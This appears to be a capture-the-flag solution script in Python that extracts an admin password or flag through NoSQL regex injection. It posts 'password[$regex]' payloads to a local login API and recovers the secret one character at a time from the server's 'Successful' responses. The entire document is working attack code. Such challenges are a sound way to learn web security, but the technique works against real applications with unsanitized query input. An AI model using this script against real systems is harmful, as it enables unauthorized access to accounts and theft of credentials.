import requests
import string

flag = "CHTB{"
url = "http://127.0.0.1:1337/api/login"

# Each time a successful login is seen, restart loop
restart = True

while restart:
    restart = False
    # Characters like *, ., &, and + has to be avoided because we use regex
    for i in "_" + string.ascii_lowercase + string.digits + "!#$%^()@{}":
        payload = flag + i
        post_data = {'username': 'admin', 'password[$regex]': payload + ".*"}
        r = requests.post(url, data=post_data, allow_redirects=False)
        # Correct char results in "successful password"
        if 'Successful' in r.text:
            print(payload)
            restart = True
            flag = payload
            # Exit if "}" gives a valid redirect
            if i == "}":
                print("\nFlag: " + flag)
                exit(0)
            break
